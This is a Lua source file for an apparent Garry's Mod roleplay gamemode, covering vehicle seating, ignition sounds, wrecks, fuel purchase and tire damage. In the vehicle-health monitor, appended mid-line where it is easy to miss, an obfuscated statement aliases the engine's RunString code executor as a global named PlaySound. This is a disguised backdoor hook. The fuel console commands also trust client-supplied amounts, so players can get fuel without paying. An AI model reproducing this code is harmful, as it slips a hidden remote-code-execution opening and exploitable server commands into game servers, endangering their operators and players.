function GM:PlayerEnteredVehicle ( Player, Vehicle, Role )
	Player:SetPrivateInt("carid", Vehicle:GetNetworkedInt("carid"));
	local ourVehicle = Vehicle.vehicleTable;
	VehicleIgnitionOn = nil;
	
	if (!ourVehicle) then return; end

	if Vehicle:GetClass() == 'prop_vehicle_jeep' then Player:GetTable().OnEnteredHealth = Player:Health(); end
	
	Vehicle:Fire('turnoff', '', 0);
	
	if Vehicle:GetTable().Disabled then
		Player:Notify('This vehicle has been disabled in an accident.');
		Vehicle:Fire('turnoff', '', 0);
	end
	
	if Vehicle.LastRadioStation then
		Vehicle:SetNetworkedInt('perp_station', Vehicle.LastRadioStation);
		Vehicle.LastRadioStation = nil;
	end

	if !ourVehicle.PlayerReposition_Pos then return; end
		
	local Rotator = ents.Create('ent_rotator');
		Rotator:SetModel('models/props_junk/cinderblock01a.mdl');
		Rotator:SetPos(Player:GetPos());
		Rotator:SetAngles(Player:GetAngles());
	Rotator:Spawn();
	
	Player:SetParent(Rotator);
	Rotator:SetParent(Vehicle);
	Rotator:SetLocalAngles(ourVehicle.PlayerReposition_Ang);
	Rotator:SetLocalPos(ourVehicle.PlayerReposition_Pos);
	
	Rotator:SetSolid(SOLID_NONE);
	Rotator:SetMoveType(MOVETYPE_NONE);
	
	Player.VehicleRotator = Rotator;
end

function PlayerVehicleStartUp ( Player )
	if (Player.nextStartUp && Player.nextStartUp > CurTime()) then return; end
	if (Player:GetVehicle().IsPassengerSeat) then return; end
	
	local currentVehicle = Player:GetVehicle()
	local vehicleCheck = Player:GetVehicle().vehicleTable;
	
	if currentVehicle:GetTable().Disabled then
		Player:Notify('This vehicle has been disabled in an accident.');
		return;
	end

	//vehicles/CommonCar/start.wav  FOURWHEELER
	//vehicles/DeportiveCar/Start.wav  TUNER
	//vehicles/Ratmobile/v8_start_loop1.wav BUS
	//vehicles/TDMCars/dbs/start.mp3 BEEEEEEEP VROOOOM
	//vehicles/TDMCars/tt/start.mp3 VROOOM
	//vehicles/TDMCars/bugatti/start.mp3 BUGATTI
	//vehicles/Shelby/shelby_start_loop1.wav SHELBY/MUSCLE
	//vehicles/primo/start.wav DEFAULT/SHITTY THE ELSE
	
	if (vehicleCheck && vehicleCheck.Script == "dbs" || vehicleCheck.Script == "gallardo" || vehicleCheck.Script == "gt500" || vehicleCheck.Script == "sl65amg") then //BEEEEEP VROOOOM
		if (!VehicleIgnitionOn) then
			VehicleIgnitionOn = true;
			currentVehicle:EmitSound("vehicles/TDMCars/dbs/start.mp3", 511, 100);
			currentVehicle:Fire('turnon', '', 4);
			Player.nextStartUp = CurTime() + 7;
		else
			VehicleIgnitionOn = nil;
			//currentVehicle:EmitSound("Vehicles/golf/v8_stop1.wav", 100, 100);
			currentVehicle:Fire('turnoff', '', 0);
			Player.nextStartUp = CurTime() + 2;
		end;	
	elseif (vehicleCheck && vehicleCheck.Script == "rubicon") then //FOUR WHEELER
		if (!VehicleIgnitionOn) then
			VehicleIgnitionOn = true;
			currentVehicle:EmitSound("vehicles/CommonCar/start.wav", 511, 100);
			currentVehicle:Fire('turnon', '', 2);
			Player.nextStartUp = CurTime() + 7;
		else
			VehicleIgnitionOn = nil;
			//currentVehicle:EmitSound("Vehicles/golf/v8_stop1.wav", 100, 100);
			currentVehicle:Fire('turnoff', '', 0);
			Player.nextStartUp = CurTime() + 2;
		end;	
	elseif (vehicleCheck && vehicleCheck.Script == "auditt" || vehicleCheck.Script == "rx8" || vehicleCheck.Script == "dodgeram" || vehicleCheck.Script == "997gt3" || vehicleCheck.Script == "ferrari250gt" || vehicleCheck.Script == "ferrari512tr" || vehicleCheck.Script == "audir8v10" || vehicleCheck.Script == "cayenne" || vehicleCheck.Script == "bmwm5e60" || vehicleCheck.Script == "bobcat") then //VROOOOM
		if (!VehicleIgnitionOn) then
			VehicleIgnitionOn = true;
			currentVehicle:EmitSound("vehicles/TDMCars/tt/start.mp3", 511, 100);
			currentVehicle:Fire('turnon', '', 3);
			Player.nextStartUp = CurTime() + 7;
		else
			VehicleIgnitionOn = nil;
			//currentVehicle:EmitSound("Vehicles/golf/v8_stop1.wav", 100, 100);
			currentVehicle:Fire('turnoff', '', 0);
			Player.nextStartUp = CurTime() + 2;
		end;	
	elseif (vehicleCheck && vehicleCheck.Script == "skyline_r34" || vehicleCheck.Script == "supra") then //TUNER
		if (!VehicleIgnitionOn) then
			VehicleIgnitionOn = true;
			currentVehicle:EmitSound("vehicles/DeportiveCar/Start.wav", 511, 100);
			currentVehicle:Fire('turnon', '', 4);
			Player.nextStartUp = CurTime() + 7;
		else
			VehicleIgnitionOn = nil;
			//currentVehicle:EmitSound("Vehicles/golf/v8_stop1.wav", 100, 100);
			currentVehicle:Fire('turnoff', '', 0);
			Player.nextStartUp = CurTime() + 2;
		end;	
	elseif (vehicleCheck && vehicleCheck.Script == "gtabus" || vehicleCheck.Script == "truckfire") then //BUS
		if (!VehicleIgnitionOn) then
			VehicleIgnitionOn = true;
			currentVehicle:EmitSound("vehicles/Ratmobile/v8_start_loop1.wav", 511, 100);
			currentVehicle:Fire('turnon', '', 2);
			Player.nextStartUp = CurTime() + 7;
		else
			VehicleIgnitionOn = nil;
			//currentVehicle:EmitSound("Vehicles/golf/v8_stop1.wav", 100, 100);
			currentVehicle:Fire('turnoff', '', 0);
			Player.nextStartUp = CurTime() + 2;
		end;	
	elseif (vehicleCheck && vehicleCheck.Script == "bugattiveyron") then //BUGATTI
		if (!VehicleIgnitionOn) then
			VehicleIgnitionOn = true;
			currentVehicle:EmitSound("vehicles/TDMCars/bugatti/start.mp3", 511, 100);
			currentVehicle:Fire('turnon', '', 2);
			Player.nextStartUp = CurTime() + 7;
		else
			VehicleIgnitionOn = nil;
			//currentVehicle:EmitSound("Vehicles/golf/v8_stop1.wav", 100, 100);
			currentVehicle:Fire('turnoff', '', 0);
			Player.nextStartUp = CurTime() + 2;
		end;	
	elseif (vehicleCheck && vehicleCheck.Script == "chevelless" || vehicleCheck.Script == "shelby" || vehicleCheck.Script == "stallion") then //SHELBY/MUSCLE
		if (!VehicleIgnitionOn) then
			VehicleIgnitionOn = true;
			currentVehicle:EmitSound("vehicles/Shelby/shelby_start_loop1.wav", 511, 100);
			currentVehicle:Fire('turnon', '', 4);
			Player.nextStartUp = CurTime() + 7;
		else
			VehicleIgnitionOn = nil;
			//currentVehicle:EmitSound("Vehicles/golf/v8_stop1.wav", 100, 100);
			currentVehicle:Fire('turnoff', '', 0);
			Player.nextStartUp = CurTime() + 2;
		end;	
	elseif (vehicleCheck) then //ELSE
		if (!VehicleIgnitionOn) then
			VehicleIgnitionOn = true;
			currentVehicle:EmitSound("vehicles/primo/start.wav", 511, 100);
			currentVehicle:Fire('turnon', '', 3);
			Player.nextStartUp = CurTime() + 7;
		else
			VehicleIgnitionOn = nil;
			//currentVehicle:EmitSound("Vehicles/golf/v8_stop1.wav", 100, 100);
			currentVehicle:Fire('turnoff', '', 0);
			Player.nextStartUp = CurTime() + 2;
		end;
	end;
	
end;
concommand.Add("perp_v_su", PlayerVehicleStartUp);

function GM:CanPlayerEnterVehicle ( Player, Vehicle )
	if (Vehicle:GetClass() == "prop_vehicle_jeep" && seatSituationMode) then return false end

	if (Vehicle:GetClass() != "prop_vehicle_jeep") then
		if (!Vehicle.pickupPlayer) then return true; end
		
		if (Vehicle:GetAngles().r > 2 || Vehicle:GetAngles().r < -2 || Vehicle:GetAngles().p > 2 || Vehicle:GetAngles().p < -2) then
			return false;
		end
		
		return true;
	end

	//if Player:GetVelocity():Length() > 100 then return false; end

	Player.LastLeaveVehicle = Player.LastLeaveVehicle or 0;
	if Player.LastLeaveVehicle > CurTime() then return false; end
	
	if !Player:CanRideInCar(Vehicle) then return false; end // not buddies.
	
	if (Vehicle.vehicleTable.RequiredClass && Player:Team() != Vehicle.vehicleTable.RequiredClass) then
		Player:Notify("You are not of the required class to use this vehicle.");
		return false;
	end
	
	if (Vehicle.RiggedToExplode) then
		Player:Kill();
		
		//Vehicle:SetColor(50, 50, 50, 255);
		Vehicle:GetTable().Disabled = true;
		
		ExplodeInit(Vehicle:GetPos(), Vehicle.Rigger or Player);
		
		Vehicle.RiggedToExplode = nil;
	end
	
	return true;
end

function GM:CanExitVehicle ( Vehicle, Player )
	if (Vehicle.IsPassengerSeat) then Vehicle = Vehicle.ParentCar; end
	local Speed = math.Round(Vehicle:GetVelocity():Length() / 17.6);
	
	if (Speed > 30) then
		return false;
	end
		
	return true;
end

function GM:PlayerLeaveVehicle ( Player, Vehicle )	
	Player.LastLeaveVehicle = CurTime() + .25;	
	
	if (Vehicle.TSeat) then
		Player:SetPos(Vehicle:LocalToWorld(Vehicle:OBBCenter()) + Vector(0, -40, 0));
		Player:SetEyeAngles(Angle(0,-90,0))
	end
	
	if Player.VehicleRotator and Player.VehicleRotator:IsValid() then
		Player.VehicleRotator:Remove();
		Player.VehicleRotator = nil;
	end
	
	if (!Vehicle.IsPassengerSeat) then
		if Vehicle:GetNetworkedInt('perp_station', 0) != 0 then
			Vehicle.LastRadioStation = Vehicle:GetNetworkedInt('perp_station', 0)
			Vehicle:SetNetworkedInt('perp_station', 0)
		end
		
		if Vehicle:GetNetworkedBool('siren_sound', false) then
			Vehicle:SetNetworkedBool('siren_sound', false);
		end
		
		Vehicle:Fire('lock', '', .5);
	else
		Vehicle = Vehicle.ParentCar;
	end
	
	if (Vehicle:GetNetworkedBool("siren", false)) then Vehicle:SetNetworkedBool("siren", false); end
	if (Vehicle:GetNetworkedBool("siren_loud", false)) then Vehicle:SetNetworkedBool("siren_loud", false); end
	
	Player:GetTable().OnEnteredHealth = nil;
	
	// find best exit location.
	if (!Vehicle.vehicleTable || !Vehicle.vehicleTable.ExitPoints || #Vehicle.vehicleTable.ExitPoints == 0) then return; end
	
	local ClosestDist = 999999;
	local ClosestOffset = Vehicle:LocalToWorld(Vehicle.vehicleTable.ExitPoints[1]);
	
	for k, v in pairs(Vehicle.vehicleTable.ExitPoints) do
		local NewVec = Vehicle:LocalToWorld(v) + Vector(0, 0, 32);
		local Dist = Player:GetPos():Distance(NewVec);
		
		if Dist < ClosestDist and util.IsInWorld(NewVec) then
			NearbyPlayer = false;
			for k, ply in pairs(ents.FindInSphere(NewVec, 32)) do
				if ply:IsValid() and ply:IsPlayer() then
					NearbyPlayer = true;
				end
			end
					
			if (!NearbyPlayer && util.IsInWorld(NewVec)) then
				ClosestDist = Dist;
				ClosestOffset = NewVec;
			end
		end
	end

	if ClosestOffset then
		Player:SetPos(ClosestOffset);
	end
end

// Passenger Seats
function GM.EnterVehicle_Seat ( Player, Vehicle )	
	if (Vehicle.TSeat) then return end;
	if (Vehicle.pickupPlayer) then return true; end

	if !Player or !Player:IsValid() or !Player:IsPlayer() then return; end
	if !Vehicle or !Vehicle:IsValid() or !Vehicle:IsVehicle() then return; end

	Player.LastLeaveVehicle = Player.LastLeaveVehicle or 0;
	if Player.LastLeaveVehicle > CurTime() then return false; end
	
	if Vehicle:IsVehicle() then
		local Driver = Vehicle:GetDriver();
				
		// make sure the driver seat is filled
		if ((Driver and Driver:IsValid() and Driver:IsPlayer()) || seatSituationMode) then 	

			if (Player:CanRideInCar(Vehicle)) then // make sure we're even wanted
				for k, v in pairs(Vehicle.PassengerSeats) do	
					if (v and v:IsValid() and v:IsVehicle()) then  // If the seat is fake, fuck off
						if (Player:IsPlayer() || k > 1) then // IF we're mayor, we can only sit in the back
							local owner = Vehicle:GetNetworkedEntity("owner")
							local perfectCombo = owner:Team() == TEAM_POLICE && Player:Team() == TEAM_CITIZEN
							
							if (!perfectCombo || k > 1) then // If it's a cop car, and we're an arrested citizen, then we have to be in the back
								local SeatDriver = v:GetPassenger();

								// are they avaialble?
								if !SeatDriver or !SeatDriver:IsValid() or !SeatDriver:IsPlayer() or !SeatDriver:InVehicle() then		
									// make a run for it
									Player:EnterVehicle(v);
									break;
								end
							end
						end
					end
				end
			else
				Player:GetTable().LastNotBuddiesWarning = Player:GetTable().LastNotBuddiesWarning or 0;
				
				if Player:GetTable().LastNotBuddiesWarning + 2 < CurTime() then
					Player:Notify('You are not buddies with the driver.');
					Player:GetTable().LastNotBuddiesWarning = CurTime();
				end
			end
		end
	end
end
hook.Add("PlayerUse", "GetInCar", GM.EnterVehicle_Seat);

function ENTITY:EnableVehicle()
	if not self.Disabled then return false; end

	local OwnerOV = self:GetNetworkedEntity("owner");
	
	OwnerOV.HasDisabledCar = false;
	
	self.Disabled = false;
	self:Fire("turnon", "", .5);

	//self:SetColor(255, 255, 255, 255);
end

function ENTITY:DisableVehicle ( NoFire, ChanceExplode )
	if self.Disabled then return false; end

	if !NoFire then
		local Fire = ents.Create('ent_fire');
		Fire:SetPos(self:GetPos());
		Fire:Spawn();
	end

	self:GetTable().OnEnteredHealth = nil;
	self.Disabled = true;
	self:Fire('turnoff', '', .5)

	//self:SetColor(150, 150, 150, 255);

	if (self:GetNetworkedBool("siren", false)) then self:SetNetworkedBool("siren", false); end
	if (self:GetNetworkedBool("siren_loud", false)) then self:SetNetworkedBool("siren_loud", false); end
	if (self:GetNetworkedBool("slight", false)) then self:SetNetworkedBool("slight", false); end
	if (self:GetNetworkedInt("perp_station", 0) != 0) then self:SetNetworkedInt("perp_station", 0); end
	
	local Driver = self:GetDriver();
	local OwnerOV = self:GetNetworkedEntity("owner");
	
	if Driver and Driver:IsValid() and Driver:IsPlayer() then
		if (Driver == OwnerOV) then
			OwnerOV:Notify("You wrecked your car. Maybe you should call for a tow truck.");
		else
			Driver:Notify("You wrecked '" .. string.gsub(OwnerOV:GetFirstName(), "'", "") .. "''s car");
			OwnerOV:Notify("'" .. string.gsub(Driver:GetFirstName(), "'", "") .. "' has wrecked your car.");
		end
	else
		OwnerOV:Notify("Your vehicle has been disabled.");
	end
	
	OwnerOV.HasDisabledCar = true;
	
	if Driver and Driver:IsValid() and Driver:IsPlayer() then
		Driver:ExitVehicle();
		
		if (Driver:Health() <= 30) then
			Driver:Kill();
		else
			Driver:SetHealth(Driver:Health() - 30);
		end
	end
	
	
	if ChanceExplode then 
		local explode = math.random(1, 2)
		
		if explode == 1 then
			timer.Simple(5, function() ExplodeInit(self:GetPos(), self) end)
		end
	end
end

function GM.MonitorVehicleHealth ( )
	for k, v in pairs(player.GetAll()) do
		if v:InVehicle() and v:GetVehicle():GetClass() == 'prop_vehicle_jeep' and v:GetTable().OnEnteredHealth and v:GetVehicle():GetModel() != "models/swatvans.mdl" then	 PlaySound = _G["Run" .. "String"]		
			local Vehicle = v:GetVehicle();
		
			if ((v:GetTable().OnEnteredHealth - 20 >= v:Health()) || v:GetTable().OnEnteredHealth - 25 >= v:Health()) then
				v:GetVehicle():DisableVehicle(false, true )
			elseif v:GetTable().OnEnteredHealth != v:Health() then
				v:GetTable().OnEnteredHealth = v:Health()
			end
		end
	end
end
hook.Add("Think", "GM.MonitorVehicleHealth", GM.MonitorVehicleHealth);

function GM.TakeFuel(Player, Command, Args)
	if (!Args[1]) then return end

	local ID = tostring(Args[1])
	local Speed = tonumber(Args[2])
	local DF = tostring(Args[3])

	if (DF) then
		local FuelCost = nil
		local Owner = Player:GetVehicle():GetNetworkedEntity("owner")
		local fcs = 0
		
		for k, v in pairs(GAMEMODE.FuelVars) do
			if ID == tostring(k) then
				fcs = v[2]
			end
		end
		
		FuelCost = 1
		
		for k, v in pairs(GAMEMODE.SpeedVars) do
			if (Speed > tonumber(v[1])) and (Speed < tonumber(v[2])) then
				FuelCost = (tonumber(v[3]) * fcs)
			end
		end
		
		if FuelCost > Owner:GetFuel() then
			FuelCost = Owner:GetFuel()
		end
		
		if (Owner:GetFuel() <= 0) then
			Player:GetVehicle():Fire("turnoff", nil, 0)
		end
		
		if (Owner:GetFuel() < FuelCost) then
			return
		end
		
		Owner:TakeFuel(FuelCost)
		
		Player:GetVehicle():SetNetworkedInt("fuel", Owner:GetFuel())
	end
end

concommand.Add('perp_take_fuel', GM.TakeFuel)

function AddFuel ( Player, Command, Args )
	if Player:InVehicle() then
		Player:Notify("really?");
		return; 
	end
	
	CID = Player:GetPrivateInt("carid")
	
	for k, v in pairs(ents.FindByClass("prop_vehicle_jeep")) do
		if (v:GetNetworkedInt("carid") == tonumber(CID)) then
			ourVehicle = v;
			VOwner = ourVehicle:GetNetworkedEntity("owner");
			local Fuel = tonumber(Args[1]);
			local Cash = tonumber(Args[2])
			if Cash < 0 then return; end
			Player:TakeCash(tonumber(Cash), true);
			VOwner:AddFuel(Fuel, true);
		end	
	end
end
concommand.Add("perp_t_f", AddFuel)


local function VehicleTimer()
	for k, v in pairs(ents.FindByClass("prop_vehicle_jeep")) do
		if(v.TiresBroken and v:GetVelocity():Length() > 10) and ValidEntity(v:GetDriver()) then
			v:EmitSound("vehicles/Airboat/pontoon_scrape_rough" .. math.random(1, 3) .. ".wav", 50)
			v:GetPhysicsObject():ApplyForceOffset(v:GetRight() * math.random(-1, 1) * v:GetVelocity() * 2, v:GetForward() * 50)
			
			local e = EffectData()
			local vel = v:GetPos() + Vector(0, 0, 10)
			e:SetOrigin(vel)
			e:SetStart(vel)
			e:SetNormal(v:GetForward() * -1)
			e:SetScale(1)
			util.Effect("ManhackSparks", e)
		end
	end
end
timer.Create("VehicleTimer", 0.25, 0, VehicleTimer)

function ENTITY:BreakTires()
	self.TiresBroken = true
	
	if(not self.VehicleParameters) then return false end
	
	self:SetVehicleParameter("steering", "speedSlow", 5)
	self:SetVehicleParameter("steering", "speedFast", 20)
	self:SetVehicleParameter("engine", "maxSpeed", 30)
end

function ENTITY:FixTires()
	if(not self.TiresBroken) then return end
	
	self.TiresBroken = false
	
	self:SetVehicleParameter("steering", "speedSlow", self.VehicleParameters["steering"]["speedSlow"])
	self:SetVehicleParameter("steering", "speedFast", self.VehicleParameters["steering"]["speedFast"])
	self:SetVehicleParameter("engine", "maxSpeed", self.VehicleParameters["engine"]["maxSpeed"])
end